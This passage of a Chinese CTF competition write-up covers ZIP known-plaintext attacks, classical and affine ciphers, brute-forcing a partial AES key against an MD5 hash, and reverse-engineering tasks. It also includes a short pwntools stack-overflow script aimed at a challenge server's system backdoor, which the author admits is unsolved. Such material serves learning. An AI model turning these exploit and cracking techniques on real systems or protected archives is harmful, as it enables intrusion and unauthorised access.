发现里面有一个加密的"flag.zip"和tips.txt文件。这次是真加密，提示输入密码，先用ARCHPR试着爆破一下，感觉不太能跑出来的样子；tips提示是"[--(CRC-32)--]"，CRC是一种校验码，可以用来验证文件的完整性与正确性，并且是一种易碰撞的哈希，起到标识文件的作用，但是它无法用于修复文件，如果被加密的flag大小比较小（六字节左右）可以考虑用**CRC碰撞**直接解出flag，但这里的flag长度有22个字节显然不行，恰巧flag.zip里也有tips.txt，那有可能是明文攻击，将tips压缩后得到zip文件，内部的tips文件CRC与flag.zip里的CRC是一样的，说明确实是明文攻击，拖进ARCHPR里分析一下就出来了，直接从包中读取flag就行

题目里的"I saw"指的就是明文攻击吧

* 为了避免ARCHPR报错，压缩tips文件需要尽量用与flag.zip相同的压缩软件或算法，同样是压缩成zip，7z和rar却一个报错一个不报错；
* ARCHPR明文攻击条件下，选择文件时先选加密文件会有报错：无法访问xxx文档；加密算法不同会报错：文档不匹配；明文长度小于12会报错：没有足够的数据用于分析（修复前的文件就是六个字节大小的提示，无法进行明文攻击）

**参考:[**

[Qwzf-zip压缩包的总结](https://blog.csdn.net/qq_43625917/article/details/96148661)

[l3yx-破解压缩包的几种方式](https://www.cnblogs.com/leixiao-/p/9824557.html)

**]**



## Crypto

### 旅途中的收获

密文：

```
tuqh sqjxo
xuhu yi co auo
squiuh yi jxu aydw ev hecqd ucfyhu

tuqh sqjxo xuhu yi co auo squiuh yi jxu aydw ev hecqd ucfyhu
```

"Form KS" 和地中海（罗马帝国在地中海沿岸）提示了是凯撒密码，把26个密钥爆破一遍，找出可读的那一串即可：

```C++
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main(){
  string str;
  getline(cin,str);
  int i=25;
  int k=str.length();
  while(i--){
      for(int j=0;j<k;j++){
          if(str[j]==' ') continue;
          str[j]=char((str[j]-97+1)%26+97);
      }
      cout<<str<<" key="<<(25-i)<<endl;
  }

  return 1;

}
```

python脚本：

```python
s=input()
k=len(s)
for i in range(26):
        s1=""
        for j in range(k):
                if s[j]=="-" or s[j]==" ":
                        s1=s1+s[j]
                else:
                        s1=s1+chr((ord(s[j])+i-97)%26+97)

        print(s1)
```

得到明文：

```
dear cathy here is my key caeser is the king of roman empire key=10
```

flag是第三行的内容加下划线分割

### 来自异乡的演讲稿

这题目起起伏伏好多遍啊，首先是十九世纪美国的演讲稿，网上找到的可能有两个，一是索琼娜.特鲁斯女士的演讲，一是林肯总统的演讲，根据开头英文单词的数量特点：323721553，可以发现林肯的演讲有一部分是对得上的，将密文与原文对照：

```
ijv vs gms siugusy ci g umsgo tcqcf vgm, osnociu vrsorsm orgo igocji, jm gix igocji nj 
Now we are engaged in a great civil war, testing whether that nation, or any nation so 

tjitscqsygiy nj ysyctgosy, 
conceived and so dedicated, 

tgi fjiu siypms. vs gms hso ji g umsgo agoofs-bcsfy jb orgo
can long endure. We are met on a great battle-field of that 

vgm. vs rgqs tjhs oj ysyctgos g kjmocji jb orgo bcsfy, gn g bcigf msnociu kfgts bjm orjns 
war. We have come to dedicate a portion of that field, as a final resting place for those 

vrj rsms ugqs orscm fcqsn orgo orgo igocji hcuro fcqs. co cn gfojusorsm bcoociu giy 
who here gave their lives that that nation might live. It is altogether fitting and 

kmjksm orgo vs nrjpfy yj orcn.		ors kmjtsnn cn hjms chkjmogio orgi ors msnpfo.
proper that we should do this.		the process is more important than the result

323721553
```

虽然多了个and，但是无伤大雅，观察会发现密文与明文是一一对应的，所以根据密文对应的明文整理如下：

```
a-b b-f c-i d-? e-? f-l g-a h-m i-n j-o k-p l-? m-r n-s o-t p-u q-v r-h s-e t-c u-g v-w w-? x-y y-d z-?
```

会发现其中少了几个字母，以及密文相较于林肯的演讲多了一段，将它翻译出来后仔细品一品，再根据提示：flag是26个英文字母，大概可以猜到flag和加密过程有关，而且大概率是加密的字典。起初我以为是维吉尼亚密码，就整理了一下，但是发现一大串都是'f'，觉得不太对，根据二师傅在群里从出题人口中'撬'出来的提示：英文字母无论如何变幻都只有26个，大概能猜出应该是一份一一对应的字典。但起初我只考虑了密文-明文的字典格式，看着那五个对应不上的问号，查了好多好多资料，但没什么头绪。既然只有五个问号，穷举一下也就120种，平台flag每分钟只能交10次，那我罗列所有可能，花十二分钟不就搞定了？

```python
a=['j','k','q','x','z']
for i in range(5):
    for j in range(5):
        if j==i :
            continue;
        for k in range(5):
            if k==j or k==i:
                continue;
            for l in range(5):
                if l==k or l==j or l==i:
                    continue;
                for m in range(5):
                    if m==k or m==l or m==i or m==j:
                        continue;
                    print('r00t{{bfi{}{}lamnop{}rstuvhecgw{}yd{}}}'.format(a[i],a[j],a[k],a[l],a[m]))

```

* 使用python3的 `.format()` 函数时，双写大括号可以转义大括号，例如：

  ```python
  print('r00t{{{}在哪里?}}'.format('flag'))
  #输出结果为:r00t{flag在哪里?}
  ```

吐槽一下自己排列组合的程序都有点写不明白了。用该程序跑出的120种flag全都不对。

后来突然想到字典不一定是密文对明文，也可以是明文对密文，恢复的时候前者更便捷，所以让人先入为主的认为字典的模式就是如此，但题目中其实提示要我们找到的是"当时处理文件的方式"，恰巧百度百科中显示替换式密码一般会有一个关键字在前面，例如：

```
使用混合表系统，关键字为“zebras”：
明文为ABCDEFGHIJKLMNOPQRSTUVWXYZ;密文为ZEBRASCDFGHIJKLMNOPQTUVWXY。
明文为：flee at once. we are discovered；加密结果为：SIAA ZQ LKBA. VA ZOA RFPBLUAOAR。
```

显然密文对明文也有类似情况，但这种顺序出现在了中间一段，那么观察一下明文对密文的字典：

```
a-g b-a c-t d-y e-s f-b g-u h-r 
i-c j-? k-? l-f m-h n-i o-j p-k q-? r-m s-n t-o u-p v-q w-v x-? y-x z-?
```

排除前半段的特殊字母'gatysbur'，后半段恰好是顺序排列的，于是就可以确定关键字是'gatysbur'（虽然它没有什么特殊含义），后面的依次补上不重复的即可，值得一提的是这里明显看出顺序排列的其实是从 `l-f` 开始的，也就是说有可能前面的jk也是被归在特殊字符里的，但是一般来说题目会给出唯一解，所以直接恢复出如下字典：

```
a-g b-a c-t d-y e-s f-b g-u h-r 
i-c j-d k-e l-f m-h n-i o-j p-k q-l r-m s-n t-o u-p v-q w-v x-w y-x z-z
```

最后整理一下就得到flag：

```
r00t{gatysburcdefhijklmnopqvwxz}
```

**参考:[**

[世界史上最著名的十大演讲](https://www.sohu.com/a/347222362_120065545)

[CTF-古典密码](https://blog.csdn.net/weixin_52620919/article/details/119249518)

[百度百科-替换式密码](https://baike.baidu.com/item/%E6%9B%BF%E6%8D%A2%E5%BC%8F%E5%AF%86%E7%A0%81)

[拦路雨g-python3中的format函数](https://blog.csdn.net/lanluyug/article/details/80245220)

**]**

### 物不知其数

affine（仿射密码）

```
今有物不知其数，三三数之剩二，五五数之剩一，七七数之剩四，问物几何？
a=11
ilwzm reowzter nlekrq wc nle repdeinwkz kp mziecnkrc uwctko

3x+2=5y+1=7z+4

e(x)=(11x+b) mod 26
d(x)=19(x-b) mod 26

11x mod 26=1	a'=19  	
26 52 78 104 130 156 182 208=11*19-1

8 11 22 25 12

china reminder theory is the reflection of ancestors wisdom
```

仿射密码的编码函数 `e(x)=(ax+b)mod 26` 与解码函数 `d(x)=a'(x-b) mod 26` 中的a与a'互为关于26的乘法逆元，也就是有 `(a*a') mod 26=1` ，仿射密码为了保证映射的一一对应，m（在这里是26）需要与a互质，而从编码公式中不难看出b的范围是 `[0,25]` 。

根据解码公式写一个脚本爆破b得出明文即可：

```c++
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main(){
  char c,d;
  string str;
  getline(cin,str);
  int i=26;
  int k=str.length();
  for(int i=0;i<26;i++){
    string ss="";
    for(int j=0;j<k;j++){
      if(str[j]==' '){
        ss=ss+" ";
        continue;
      }
      int tmp=19*(str[j]-97-i);
      while(tmp<0){
        tmp+=26;
      }
      ss=ss+char((tmp%26)+97);
    }
    cout<<ss<<endl;
  }

  return 1;

}
```

python写的还是没有C++明白...python我不是很清楚字符的编码转换，所以就写了C++。这里值得注意的地方在于减b是不能写成加b来爆破的，直观上关于26取模加减b都是一样轮换的，但实际不是这样，因为前面的系数a'导致加减b的效果并不相同，而很不巧的是C++做不来负数的求余，例如它的 `-5 % 26` 的结果是-5，所以还需要将中间量转为正数再继续运算。还有个结论：`a(x-b) mod 26 = (ax - (ab mod 26)) mod 26` 。证明从略。

**参考:[**

[仿射密码（Affine）](https://blog.csdn.net/weixin_47024013/article/details/118662869)

[1ance.-仿射密码](https://blog.csdn.net/weixin_44033675/article/details/115983293)

[仿射密码原理及例子](https://blog.csdn.net/ISHobbyst/article/details/120094476)

**]**



### 跨越世纪的密码学

下载下来一个rsa的python程序，需要简单了解一下rsa加密的实现，然后了解一下python如何实现rsa，安装好相关的包后试着根据程序反向找出flag

首先是从环境中插入了flag_e，然后以它作为明文进行rsa公私钥的生成并加密成密文。已知密文c，公钥e，素数乘积n，n的欧拉函数phi，可以用 `ed=1 mod phi` 得出私钥d，然后 `m=c^d mod n` 得到明文m，由于在python中输出明文n显示了乱码的具体值：`\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf` ，刚好十二个字节，而密钥少了六个字节的数字字符（这段英文确认了好几遍，是数字的字符），下面的Mode在[AES](https://zhuanlan.zhihu.com/p/78913397)中有五种，都是三个英文组成的，刚好有六个字节的乱码，我以为这其中有什么转换关系，解码解了两个小时，查了AES无数遍，看了一堆编码，如"unicode"的'utf-8'和'utf-16'与其他编码的关系，python3中bytes类型与str类型的关系与转换，python3默认的编码类型是'UTF-8'，`bytes(str,encoding='utf-8')` 可以转换成字节形式，尝试了将十六进制相互异或得到一字节的数据，python3中只有数字类型可以进行异或运算，字节流也不行，`0b1010` 表示1010的二进制数字，`0xaa` 表示aa的十六进制数字，`'\xab\xc'` 可以便捷的用编码构造字符串，`b'xxx'` 表示字节类型的字符串数据，`f'ab{name}'` 快速将name变量的值格式化进字符串中。结果整到最后还是没弄明白有什么联系。

```python
from Crypto.Util.number import getPrime,bytes_to_long
from flagenc import flag_e

def rsa_enc(m):	#输入明文
    p = getPrime(2048)	#获得2048位的素数
    q = getPrime(2048)

    n = p * q	
    phi = (p - 1) * (q - 1)
    e = 65535	#公钥
  
    c = pow(m,e,n)	#c=m^e mod n 加密                                             
    return c,n,phi

if __name__ == "__main__":	#作为非脚本运行时
    m = bytes_to_long(flag_e.encode())	#flag编码后转换为长整型
    c,n,phi = rsa_enc(m)	#生成密文
    print("n:",n)
    print("c:",c)
    print("phi:",phi)
    
#n=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565332659159017315830404108112573513422514092211961809397683826860955333907492076319697683873070988203533060172226299654640431372636664212890855901106009335408904168663444062395560923280893905574621349215890287022016634315310170201933483641286343232522486854219001353298681437247810130313463294469449829433938014276089581871069130799778570050071269974901888486341414636683400249073904645454444221128885705910670862174811188058907878240460286507231250059471859162034722561368270784238102430157809160745418630702375154475602643880513301644310519285011767707528037046886574977679327586544694372164176809557853155542871095253

#c=391697005929552889899624830215124682575267078889079201072133494095145759579046066347252915001923189313973278571826223859645184908706427072190715810096762282243880619637348016497361444041933947882850250418927379704657622278598816689855084883059158337921836786317565166049871100026006393993288893058936739439738022130124099305108140743259731160066564274872151968129045918085079143799107277739464655582585781071099212520363988493913082922866099403377300673366747825256467038243192399767164076685852234653970502846413632195424760038541958148380660429785487390583553120274885240552255285089606977744941886013772747881926208782099692077427795179462019605178557106459296546975237531251622042718424305286207681047331067563366960995950636061474397803323838669834764420996419209392870582956326172388319536169644790216185451519917476555609250782848706670945702170334385909547448130814462907972601574007677975767368742231704088242374802664674914635640557841912213450212858885643646516543254448927591662502002704405591678642934442843031804623559824142416740069180900533516164725769842816713265524045088835470803505780159404892637737146146489585446452325219790835092436936741277597038779688278316092540356696242286837477820043838990654446689758405

#phi=867155340496248213301586304890718046684097603182698166675357935094869339496253362770289588842444204285489236132699113244761105785116720180484908127473160802904351735800850629064863736877707929824244234773050272557962380399874645023097356433595961619408269973342343414782972781943530908494965642940923078675536492824148865191282146320931079675140981055110661956238581921591540829318228457701521519950977276253017203039999274415270059471305364104650392113681314848109146999829110097300990944278314275073793412484875105972426016431420915537338367114105764440233051064421419557616280275166082172623952244755626821427565273711064097635722624828303228560977280604283312275720472893738908340485615199442472241554366592725905561371790414263688546266940109530780916523535916653049978164944441237790588358454981712188848464526040048848867904939345772067113042277048544521709018387414016554452106447169079353564720720933763588687864105154485920469108666959519751145013048856811573769466659173292069248737253417982792923468757575784464619482225159866464340115984115915768033859486388780434401618224707697523974328704810085445202274804749169121510267897644783956768255707509767680678009026141447435902688170793766234897120468408039285910787786528

#ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58
#Encrypt Method: AES
#Key: 1732050807\xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf
#	\x67\x3c\xff\x77  \xc2\xaa\xc2\xbb\xc3\x8c\xc3\x9d\xc3\xae\xc3\xbf
#	1732050807 89
#IV: 0000000000000000
#Mode: \xc2\xa5  \xc2\xb6  \xc3\x87

#CFB
#OFB


#Notice: key is 16-digits numeric character.
#key's md5: 2116f08e96a6f9090e90c13bd28a3d15

#-------

#"ciphertext: 3b077dac356951871140411750f5e40180c342144975f9abc0070ca53f874e17935d632facadbaa88b14f4ad78599a96a2934ab2588bbbe4556c98489e64ba58
#Encrypt Method: AES
#Key: 1732050807ª»ÌÝîÿ
#IV: 0000000000000000
#Mode: ¥¶Ç
#Notice: key is 16-digits numeric character.
#key's md5: 2116f08e96a6f9090e90c13bd28a3d15
#"

#1732050807902831
```

下方注释的上半段就是一开始思路的笔记，得不出结果，后来想到乱码可能不是线索，它只是模糊了密钥的后六位，不一定用来解码，且只有在python中我可以看到具体的编码，若是以文本显示我是看不到具体的编码数据的，所以应该是被误导了，就调整了思路，将字符串重新整理了一遍，也就是下半段注释内容，会发现key的md5已经给出，已知前10位的情况下只要爆破后6位并比对md5值即可。

用python的hashlib包来写md5的爆破脚本，这里一开始用的update方法爆破不出结果，后来发现update可能是在末尾衔接新的字符串而不是重置，修改写法后就能跑出对应的密钥了

```python
#coding: utf-8

import hashlib

dic = '0123456789'
for a in dic:
    if a=='9':
        print('ending')
    for b in dic:
        for c in dic:
            for d in dic:
                for e in dic:
                    for f in dic:
                        k=hashlib.md5(f'1732050807{a}{b}{c}{d}{e}{f}'.encode('utf-8'))
                        if k.hexdigest() == '2116f08e96a6f9090e90c13bd28a3d15':
                            print(f'1732050807{a}{b}{c}{d}{e}{f}')
```

得到密钥后解密AES，填充默认即可，偏移为给出的十六个0，由于没给模式需要挨个尝试，注意右下角的编码要选择hex，这个涉及对输入密文的解析，AES算法加密时利用的是位运算，因此最终输入的数据是要经过解析的，这个选项会影响解码的成功与否

解码成功后得到flag（所以跨世纪的密码学到最后也没用上古典密码学）

**参考:[**

[百度百科-RSA](https://baike.baidu.com/item/RSA%E7%AE%97%E6%B3%95/263310)

[unicode编码](https://www.cnblogs.com/crazylqy/p/10184291.html)

[AES加密](https://blog.csdn.net/zhaoyanjun6/article/details/120285594)

**]**

### 编码的叠加态

题目提示了解码顺序是：base32，hex，base64，颜文字，莫斯电码和keyboard

一开始没注意提示，下载文件后看到结尾的==就试着用base64解码了一下，结果失败了

颜文字密码是"AAencode"，一个JavaScript的神奇实现，按理来说本地浏览器的控制台应该也能跑，但一直报错，只能靠解码网站：[AAEncode加密/解密](http://www.atoolbox.net/Tool.php?Id=703)

然后是莫斯电码，先删除末尾的封号，最初版本的文件是有点问题的，LIP的I那里出错了。莫斯电码解码出来得到的密文要用"keyboard"解码，一开始以为是对照键盘位置做字母代换：

```python
letters=['q', 'w','e','r','t','y','u','i','o',
     'p','a','s','d','f','g','h','j','k',
     'l','z','x','c','v','b','n','m']
letter=['k','x','v','m','c','n','o','p','h','q','r','s','z',
        'y','i','j','a','d','l','e','g','w','b','u','f','t']


s=str(input())
k=len(s)
s2=s.lower()
print(s2)

def a2q(s2):
    s1=""
    for i in range(k):
        if s2[i]=='-' or s2[i]==' ':
            s1=s1+s2[i]
        else:
            s1= s1+letters[ord(s2[i])-97]
    print(s1)

def q2a(s2):
    s1=""
    for i in range(k):
        if s2[i]=='-' or s2[i]==' ':
            s1=s1+s2[i]
        else:
            s1= s1+letter[ord(s2[i])-97]
    print(s1)

a2q(s2)
q2a(s2)

```

结果得不到有效的文字，然后又跑了一遍凯撒，还是不行。后来找到了另一种"keyboard"密码：[CTF古典密码学](https://zhuanlan.zhihu.com/p/222691227)，居然是键盘围绕的字母得出明文，属实脑洞大开，最后得到明文，但是包装成flag还需要尝试一下格式：

```
WDR-BHM-NKUH-ILP-THU-THU-LIP-YJI-EFT-AXDW-WSR-POK-DCGR

e-n-j-o-y-y-o-u-r-s-e-l-f
r00t{ENJOY_YOURSELF}
```



## Pwn

### EasyOverflow

怪怪的...只要往密码里输入'password'就能得到flag，不是很懂为什么hhhh，所以溢出了个啥呢

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539741.png)

听出题人说这题因为username只能读取9位，多的会覆盖原有的密码（直接替换不拼接），所以溢出的最多8位是可控的密码，比如你在username中输入"123456789abcdefgh"，那么密码栏就输入"abcdefgh"即可。

### EasyOverflow2（未解出）

这是一个pwn的简单的栈溢出，拖进ida分析会看见一个system后门与一个可能造成溢出的get函数，目标就是调用get函数时用输入填满栈空间覆盖原有内容，然后覆盖ebp，最后再覆盖eip，将跳转的system函数的调用地址传入到原本eip存储栈返回地址的地方，从而执行eip拿到shell。

以上是基本思路，可以使用python的pwntools构造exp，remote提供远程连接，构造payload，需要先得出偏移量，也就是函数开始到eip的地址差值，用无用数据将其填满，然后再将要跳转的地址传进去，p32表示将数据压缩成bytes类型，这里没有弄明白到底如何得到偏移量就随便填了一个，`sendline` 函数发送一行的内容，会自动加上换行符，`send` 函数则会原样发送，`interactive` 会进入shell式的交互界面（也就是与nc的目标进行交互），结束后用 `close` 关闭连接。

```python
from pwn import *
io=remote("81.69.243.226",30012)
payload=b"A"*0x1449+p32(0x401278)
io.sendline(payload)
io.interactive()
io.close()
```

所以这题真正的难点在于如何判断出偏移量和后门函数的地址。我一开始像在ida中看函数的栈调用情况，但是没有整明白，网上很多exp的思路用的都是gdb的调试动态查找地址情况，其实ida也可以调试，但本题的程序只能在linux环境中运行，所以ida中没有"windows debugger"，而且用pwntools连接本地的pwn程序，`process` 会报错也是这个原因，所以只能在linux环境下用dbg调试才能得到偏移量，但本地的wsl包管理出了点问题，不是很熟悉linux命令，暂时还配置不了环境；远程的服务器也是类似原因暂时无法配置环境，最后的思路是直接实测，通过不断输入变大的payload测试溢出点，但是出现了很奇怪的情况，开始看似溢出的点后来发现又没有溢出，可是payload已经很大了，因为没有类似的经验，我也不是很清楚溢出的实际效果，所以最后只能暂时作罢，没能解出flag，只是记录一下自己的思路。

* ".dll"为动态链接库，是windows的可执行文件；".lib"是静态链接库，可执行文件；Windows下PE指示可执行，Linux下ELF指示可执行

**参考：[**

[栈溢出的原理以及EXP的编写](https://www.freebuf.com/articles/system/253225.html)

[pwntools的安装与基本使用](https://blog.csdn.net/weixin_43833642/article/details/104181681)

[GDB下载及安装教程](http://c.biancheng.net/view/8130.html)

[GDB入门教程](https://oi.men.ci/gnu-debugger/)

[Jwizard-栈溢出从入门到放弃](https://zhuanlan.zhihu.com/p/25816426)

**]**

## Reverse

### Too Much Chaos

给了一个能跑出flag的C++程序，里面有各种错误，包括语法，死循环，算法错误，修复后即可得到flag，需要说明的是不会报错的错误如算法实现失败，main函数拼成mian（程序找不到main函数在VSC中会导致生成不了exe从而导致无法运行）等。难度不大，仔细观察即可。

### AT.FILED

就是简单的大小写置换，但是'e'不会被转换成'E'，因此根据给出的结果反推输入时会有多解。根据置换后的结果，反推置换前的输入，就能得到一个正确的flag：

```
YoUR_fLAG_Is_HeRE
```

### Zebra

这道题丢进IDA64后先找main函数，然后发现是一个检验运算，输入一串10检验是否与unsigned数组c中的内容相等，经过分析就是将unsigned数组中的数值写成四位的二进制并展开，因此要看unsigned数组中的内容如何，通过地址来到数组的内容界面，由于unsigned的大小是四个字节，在hexview中调整format为unsigned，4bytes，然后计算数组的地址范围：

```
40F020
	2400
411420
```

在计算机中地址随内存的增大是从低往高增长的，地址的单位就是字节，以十六进制的形式表示，一个字节是两位十六进制，而c数组是一个unsigned的数组，在C++中可以用sizeof测试一下它的大小是4个字节，所以每4位地址存储一个unsigned数据，在一个数据内部是从高位往低位读值的，因此在读取数组内容时将格式调整成4Bytes的Unsigned数据，可以直接读取它的值而不用自己处理。函数 `memcpy()` 将地址"&unk_40F020"的内容赋给数组c，2304大小的unsigned数组占用字节数是9216，转化为十六进制是2400；双击地址"&unk_40F020"可以跳转到相应地址界面看到地址内容

再将这部分的数值复制出来丢到脚本中转化一下：

```c++
#include <iostream>
#include <fstream>
#include <string>
using namespace std;
int main(){
    fstream infile,outfile;
    infile.open("./msg.txt",ios::in);
    outfile.open("./reres.txt",ios::out);
    string tmp,res="";
    int num;
    for(int i=0;i<2304;i++){
        infile>>num;
        string ss="";
        for(int j=0;j<4;j++){
            ss=char((num%2)+48)+ss;
            num/=2;
        }
        res=res+ss;
    }
    outfile<<res;
    infile.close();
    outfile.close();
    return 0;
}
```

数组c的内容存放在"msg.txt"中，C++中严格区分单双引号，单引号内被视为字符类型，双引号内被视为字符串类型。得到的内容如果想拿到程序中检验需要加上空格并分批输入，一起输入它读取不了那么多...检验后发现是正确的，因此就直接取没有空格的版本，得到如下10序列：

```
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 